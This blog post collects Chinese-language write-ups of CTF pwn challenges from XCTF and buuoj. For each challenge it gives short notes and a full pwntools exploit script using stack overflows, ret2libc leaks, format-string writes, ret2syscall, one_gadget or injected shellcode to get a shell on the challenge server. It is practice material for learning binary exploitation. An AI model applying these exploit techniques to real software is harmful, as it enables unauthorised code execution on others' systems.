---
title: buuoj_pwn
date: 2020-10-26
author: x1ngg3
description: "youhavebeenpwned"
---

you_have_been_pwned

<!-- more -->

## 什么是PWN

CTF比赛主要表现以下几个技能上：逆向工程、密码 学、ACM编程、Web漏洞、二进制溢出、网络和取证等。在国际CTF赛事中，二进制溢出也称之为PWN。

PWN是一个黑客语法的俚语词，自"own"这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的 情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如："You just got pwned!"）。有一个非常著名的国际赛事叫做Pwn2Own，相信你现在已经能够理解这个名字的含义了，即通过打败对手来达到拥有的目的。

CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程 序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag。

漏洞一般是1、gets函数这种对输入没有限制导致溢出。2、格式化字符串漏洞。3、数据类型转换的时候产生了溢出。 总的来说就是对输入的值限制的不够让用户的输入影响了执行流。 那么如何利用漏洞呢？ 在linux中有一个system函数system("/bin/bash")这条语句就可以调出shell。让程序执行这个函数就能实现对shell的调用了。

## XCTF

### get_shell - - XCTF

***

芜湖，啦啦啦啦啦~

![image-20200811223317436](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/wTrYEFWOPo62JZN.png)



### hello_pwn - - XCTF

***

```python
from pwn import *
io = remote("220.249.52.133","53289")
payload = 4*'a' + p64(0x6E756161)
io.sendline(payload)
io.interactive()
```



### when_did_you_born - - XCTF

***

简单栈溢出

```python
from pwn import *
io = remote("220.249.52.133","33894")
io.sendline("1111")
payload = 0x8 * 'a' + p64(1926)
io.sendline(payload)
io.interactive()
```



### level0 - - XCTF

***

覆盖返回地址为callsystem

```python
from pwn import *
io = remote("220.249.52.133","47970")
payload = 0x88*'a' + p64(0x400596)
io.sendline(payload)
io.interactive()
```



### level2 - - XCTF

***

先覆盖返回地址为_system函数的地址，再把_system函数的参数覆盖外hint(/bin/sh)

```python
from pwn import *
io = remote("220.249.52.133","34395")
payload = (0x88 + 0x4)*'a' + p32(0x08048320) + 4 * 'a' + p32(0x804A024)
io.sendline(payload)
io.interactive()
```



###  Cgfsb - - XCTF

***

格式化字符串漏洞，pwnme的地址在bss段，可读可写。所以构造一下再覆盖就OK了。

基本思路就是，确定覆盖地址，确定相对偏移，进行覆盖。

覆盖地址即为pwnme地址，相对偏移可以nc过去之后进行测试，pwnme地址算四个字节，要为8再补上四个字节。

另外程序是顺序执行的所以我没加recvuntil()。

```python
from pwn import *
io = remote("220.249.52.133","38897")
io.send("fsk")
io.send(p32(0x0804A068) + "aaaa%10$n")
io.interactive()
```



### cgpwn2 - - XCTF

***

栈溢出，覆盖gets()返回地址_system()，再把system的参数设为”/bin/sh“所在的地址，但是这里没有现成的”/bin/sh“，注意到在gets()之前有一个fgets()，其参数name在bss段，所以可以在这里手动输入一个"/bin/sh"。

```python
from pwn import *
io = remote("220.249.52.133","33144")
io.sendline("/bin/sh")
bin_addr = 0x0804A080
sys_addr = 0x08048420
payload = 0x2a * 'a' + p32(sys_addr) + 4 * 'a' + p32(bin_addr)
io.sendline(payload)
io.interactive()
```



### guess_num - - XCTF

***

关注srand()和rand()，设置srand()初始种子值rand()可以产生预期的随机序列。

利用gets()函数对seed[0]进行覆盖，再用ldd指令获取到guess_num文件的libc，即可产生可控的随机序列。

```python
from pwn import *
from ctypes import *
io = remote("220.249.52.133","44225")
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
payload = 0x20 * 'a' + p64(1)
io.sendline(payload)
libc.srand(1)
for i in range(10):
	num = str(libc.rand()%6+1)
	io.recvuntil("number:")
	io.sendline(num)
io.interactive()
```



### int_overflow - - XCTF

***

> 截断：将数据放入比它小的储存空间，从而出现溢出，比如把一个int赋值给一个short，只能接受低16位

关键分析代码：

```c
char *__cdecl check_passwd(char *s)
{
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h] 无符号八位整形 0 ~ 255

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )                    // 利用截断来获得一个符合条件的v3
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, s);                  // 利用栈溢出覆盖掉返回地址
  }
  return result;
}
```

```python
from pwn import *
io = remote("220.249.52.133","32339")
io.sendlineafter("choice:", "1")
io.sendlineafter("username:", "your dear father")
sys_addr = 0x0804868B
payload = 0x18 * 'a' + p32(sys_addr)
io.sendlineafter("passwd:", payload)
io.interactive()
```



### level3--XCTF

我真的佛了，打本地打了半天打不通，然后远程能打通

```python
from pwn import *
from LibcSearcher import *

sh = process('./level3')
sh = remote("220.249.52.133","43938")
elf = ELF('./level3')
write_plt = elf.plt['write']
start_got = elf.got['__libc_start_main']
main_addr = elf.symbols['main']

sh.recvuntil('Input:\n')
payload = (0x88 + 4) * 'a' + p32(write_plt) + p32(main_addr) + p32(1) + p32(start_got) + p32(4)
sh.sendline(payload)
start_addr = u32(sh.recv(4))
libc = ELF('libc_32.so.6')
base = start_addr - libc.sym['__libc_start_main']
sys_addr = base + libc.sym['system']
binsh_addr = base + libc.search('/bin/sh').next()
#binsh_addr = base + 0x15902b 
payload = (0x88 + 4) * 'a' + p32(sys_addr) + p32(main_addr) + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```

> 在libc中搜偏移
>
> strings -a -t x libc_32.so.6 | grep "__libc_start_main"

### ciscn_2019_c_1 && ciscn_2019_en_2 - - buuoj

两个一毛一样的题......

常规ret2libc。

[ctfwiki-ret2libc](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#ret2libc)

```python
from pwn import *
from LibcSearcher import *

def en(string):
    newstr = list(string)
    for i in range(len(newstr)):
        c = ord(string[i])
        if c <= 96 or c > 122:
            if c <= 64 or c > 90:
                if c > 47 and c <= 57:
                    c ^= 0xF
            else:
               c ^= 0xE
        else:
            c ^= 0xD
        newstr[i] = chr(c)
    return ''.join(newstr)

#sh = process("./ciscn_2019_c_1")
sh = remote("node3.buuoj.cn","29052")
elf = ELF("./ciscn_2019_c_1")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr =  elf.symbols['main']
rdi_addr = 0x00400c83
ret_addr = 0x004006b9 

sh.recvuntil("choice!\n")
sh.sendline("1")
sh.recvuntil("encrypted\n")
payload = 0x58 * 'a' + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
sh.sendline(en(payload))

sh.recvuntil("Ciphertext\n")
sh.recvuntil("\n")
puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8,'\x00'))
print(puts_addr)

libc = LibcSearcher("puts",puts_addr)
base = puts_addr - libc.dump("puts")

sys_addr = base + libc.dump('system')
bsh_addr = base + libc.dump('str_bin_sh')

sh.recvuntil("choice!\n")
sh.sendline("1")
sh.recvuntil("encrypted\n")
payload = 0x58 * 'a' + p64(ret_addr) + p64(rdi_addr) + p64(bsh_addr) + p64(sys_addr)
sh.sendline(payload)
sh.interactive()
```

> 这里唯一要说的就是最后一个payload的+p64(ret_addr)，里面只有一个return语句，目的是为了平衡堆栈，并且这应该是ubuntu18的毛病，在kali下打本地不要这句也可以拿到shell。
>
> 和[ld1ng](ld1ng.com)讨论了一下(说是讨论，其实是鼎哥单方面教我)，大概是因为（猜测，没有证实）两次返回了同一个函数（这里是main函数），第一个payload因为+p64(rdi_addr)，所以多了一个pop，导致栈向下移了8个字节，而ubuntu18规定必须16个字节对齐，所以需要用一个ret来对齐，经过测试这里只要是奇数个ret都是可以的，因为都满足了栈对齐。





### [OGeek2019]babyrop - - buuoj

关键判断：

```c++
buf_len = strlen(buf);						  //strlen遇到字符串'\x0'截至
if ( strncmp(buf, &s, buf_len) )              // 比较前buf_len个字节，如果buf_len为0则可绕过
	exit(0);
```

利用栈溢出覆盖v5为一个足够大的数以此来为下一步的栈溢出覆盖返回地址做准备。

然后就是ret2libc了。

```python
from pwn import *
from LibcSearcher import *
#sh = process('./babyrop')
sh = remote("node3.buuoj.cn",'27287')
elf = ELF('./babyrop')
main_addr = 0x08048825
puts_plt = elf.plt['puts']
start_main_got = elf.got['__libc_start_main']

payload = '\x00' + '\xff' * 7
#to cover v5 with a big number to stackoverflow
sh.sendline(payload)
sh.recvuntil('Correct\n')
payload = (0xe7 + 4) * 'a' + p32(puts_plt) + p32(main_addr) + p32(start_main_got)
sh.sendline(payload)
#to leak the addr of puts.got and return to main
start_main_addr = u32(sh.recv(4))
print(start_main_addr)
libc = LibcSearcher("__libc_start_main",start_main_addr)
base = start_main_addr - libc.dump('__libc_start_main')
sys_addr = base + libc.dump('system')
binsh_addr = base + libc.dump('str_bin_sh')

payload = '\x00' + '\xff' * 7
#to cover v5 with a big number to stackoverflow
sh.sendline(payload)
sh.recvuntil('Correct\n')
payload = (0xe7 + 4) * 'a' + p32(sys_addr) + 4 * 'a' + p32(binsh_addr)
sh.sendline(payload)
sh.interactive()
```



### jarvisoj_level0 - - buuoj

白给

```python
from pwn import *
#sh = process('./lo')
sh = remote("node3.buuoj.cn",'27617')
sys_addr = 0x400460
binsh_addr = 0x400684
rdi_addr = 0x400663
payload = 0x88 * 'a' + p64(rdi_addr) + p64(binsh_addr) + p64(sys_addr)
sh.sendline(payload)
sh.interactive()
```



### [第五空间2019 决赛]PWN5 - - buuoj

任意地址写

[格式化字符串漏洞学习](https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/)

```python
from pwn import *
sh = process('./pwn5')
sh = remote("node3.buuoj.cn","28184")
payload = fmtstr_payload(10, {0x804C044:12345678})
#your name:aaaa,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
#Hello,aaaa,fff82d88,63,0,f7fafae0,3,f7f7f410,1,0,1,61616161,2c78252c,252c7825,78252c78,2c78252c
sh.sendline(payload)
sh.sendline("12345678")
sh.interactive()
```



### get_started_3dsctf_2016

吐了，弄了一会ret2libc没有做出来，第二次返回到main的时候总是说too long，一查题解发现给了后门，无话可说。。。。。。。

只能说这波是老盲星了。

```python
from pwn import *
from LibcSearcher import *

sh = process('./r2t3')
sh = remote("node3.buuoj.cn","26861")
libc = ELF('libc-2.29_32.so')
elf = ELF('./r2t3')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_addr = elf.sym['main']

# binsh_addr = 0x8048760
# payload = 0x15 * 'a' + p32(puts_plt) + p32(main_addr) + p32(puts_got)
# payload = payload.ljust(260,'a')
# sh.sendline(payload)

# puts_addr = u32(sh.recv(4))
# base = puts_addr - libc.sym['puts']
# sys_addr = base + libc.sym['system']

#sh.recvuntil('name:')
payload = 0x15 * 'a' + p32(0x0804858B)
payload = payload.ljust(260,'a')
sh.sendline(payload)
sh.interactive()
```





### get_started_3dsctf_2016

啊这个题，很坑。

首先是预期解，预期就应该直接调用他的后门对吧，但是在打本地的时候我就打不通，没想明白，在网上找到了大佬的博客，找到了解决方法。

[大佬的博客](https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/xlez0w#UiBgQ)

大佬的方法是强制退出，原因是远程服务器的gets函数没有正常退出，它让程序崩溃，此时无法获取flag，此时使用exit函数使gets函数强制退出。

#### 方法一exp_backdoor:

```python
from pwn import *

sh = process('./ds')
sh = remote("node3.buuoj.cn","27757")
flag_addr = 0x080489A0
a1 = 814536271
a2 = 425138641
exit_addr = 0x0804E6A0
payload = 0x38 * 'a' + p32(flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)
sh.sendline(payload)
flag = sh.recv()
print(flag)
```

#### 方法二exp_ret2syscall:

常规的ret2syscall

不过在这里我又遇到了本地打不通远程可以打通的情况，一通baidu+google之后初步判断为Libc问题，对了，我是用到kali。

[解决一种pwn本地打不通远程打得通的问题](https://blog.csdn.net/fjh1997/article/details/105347161)

[关于jarvisOJ level0远程打得通本地打不通的问题](https://blog.csdn.net/fjh1997/article/details/107695261)

```python
from pwn import *
from LibcSearcher import *

sh = process('./ds')
sh = remote("node3.buuoj.cn","27757")
elf = ELF('./ds')
eax_addr = 0x080b91e6 
edcb_addr = 0x0806fc30
gets_plt = 0x0804F630
#read_plt = elf.plt['read']
bss_addr = elf.bss()
print(hex(bss_addr))
int80_addr = 0x0806d7e5 
main_addr = elf.sym['main']
payload = 0x38 * 'a' + p32(gets_plt) + p32(main_addr) + p32(bss_addr)
sh.sendline(payload)
sh.sendline('/bin/sh')
payload = 0x38 * 'a' + p32(eax_addr) + p32(0xb) + p32(edcb_addr) + p32(0) + p32(0) + p32(bss_addr) + p32(int80_addr)
sh.sendline(payload)
sh.interactive()
```





### ciscn_2019_n_8

注意是int，所以如果按照习惯填充'a'的话记得乘以四。

```python
from pwn import *

sh = process('./ciscn_2019_n_8')
sh = remote("node3.buuoj.cn",'26238')
payload = 'a' * 13 * 4 + p32(17)
sh.sendline(payload)
sh.interactive()
```





### not_the_same_3dsctf_2016

题目留了后门函数get_secret，后门函数将flag写在了bss段上，那只要控制程序流程先执行后门函数再通过write函数将flag打印就可以了。

```python
from pwn import *

sh = remote("node3.buuoj.cn",'26664')
flag_addr = 0x080489A0
bss_addr = 0x080ECA2D
write_addr = 0x0806E270 

payload = 0x2d * 'a' + p32(flag_addr) + p32(write_addr) + p32(1) + p32(1) + p32(bss_addr) + p32(45)
sh.sendline(payload)
flag = sh.recv()
print(flag)
```





### [BJDCTF 2nd]one_gadget

刚拿到题目看到保护全开直接吓尿了，换完裤子之后仍然一头雾水，然后我他妈直接开始搜题解。这里用到了one_gadget，一个只要满足条件就可以拿shell的好东西，具体就不多说了，网上都有。

[pwn中one_gadget的使用技巧](https://bbs.pediy.com/thread-261112.htm)

另外说一下为什么把gadget打过去就可以直接拿到shell了，网上的教程我翻了一下都是很有默契的跳过了这部分。

- **首先是满足one_gadget的条件：**

根据题目提供的Libc查看one_gadget:



![image-20201007195646212](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/u8RvOdQZqAwN3JY.png)



这里记录一下查看第四个的过程，前面三个试了下不太行，不知道是不是我操作问题，因为开启了PIE是没法直接下地址的，然后下函数的断点又报错，只能直接开跑然后看状态了，但是因为会错误退出所以我觉得也问题不大，大不了达成条件的时候用手段构造一下。

gdb直接运行，然后输入，然后就自动停了。



![image-20201007200030263](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/DgqEoSV73zpyhub.png)



- **为什么打过去就有权限**

ok那现在知道了第四个gadget是满足条件的，那为什么把gadget打过去就能拿到权限呢，毕竟反汇编代码可是这样的：



![image-20201007200229799](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/jR4PDUzS1gdsZev.png)



其实看到这种代码，心里大概就有个数了，八成是IDA犯病了，我他妈直接看汇编。



![image-20201007200422351](https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/rg1Ex9NnQXKSF8d.png)



好的那现在只差最后一步打过去了。

- **为什么是str()不是p64()**

因为我自己写exp的时候习惯性就用了p64()，然后打不通，我猜测是因为scanf把，这里是把输入直接放到了rdx里面然后call了，所以得用str()打过去吧。那为什么不直接打int呢？报错：AttributeError: 'int' object has no attribute 'encode'

```python
from pwn import *
from LibcSearcher import *
libc = ELF('libc-2.29.so')
sh = remote("node3.buuoj.cn",'27543')
sh.recvuntil("0x")
printf_addr = int(sh.recv(12),16)
sh.recv()
#ibc = LibcSearcher("printf",printf_addr)
base = printf_addr - libc.sym["printf"]
gadget_addr = base + 0x106ef8
sh.sendline(str(gadget_addr))
sh.interactive()
```





### jarvisoj_level2

白给，这题放这里就离谱

```python
from pwn import *
sh = remote("node3.buuoj.cn",'27813')
payload = (0x88 + 4) * 'a' + p32(0x08048320) +p32(0x1) + p32(0X0804A024)
sh.sendline(payload)
sh.interactive()
```





### [HarekazeCTF2019]baby_rop

注意看汇编scanf是放到了v4里面的。

然后flag放在了/home/babyrop/flag

```python
from pwn import *
sh = remote("node3.buuoj.cn","28039")
rdi_addr = 0x400683
sys_addr = 0x400480
binsh_addr = 0x601048
payload = 0x18 * 'a' + p64(rdi_addr)  + p64(binsh_addr) + p64(sys_addr)
sh.sendline(payload)
sh.interactive()
```





### bjdctf_2020_babystack

emmm，得sendline()，不然拿不到shelle.......

```python
from pwn import *
sh = remote("node3.buuoj.cn","29064")
sys_addr = 0x4006E6
payload = 0x18 * 'a' + p64(sys_addr)
sh.sendline('50')
sh.sendline(payload)
sh.interactive()
```





### ciscn_2019_n_5

啥保护没开，bss写shellcode就可以了

```python
from pwn import *
from LibcSearcher import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
sh = remote("node3.buuoj.cn","29818")
elf=ELF("./ciscn_2019_n_5")
sh.sendline(asm(shellcraft.sh()))
payload = 0x28*'a'+p64(0x601080)
sh.sendline(payload)
sh.interactive()
```

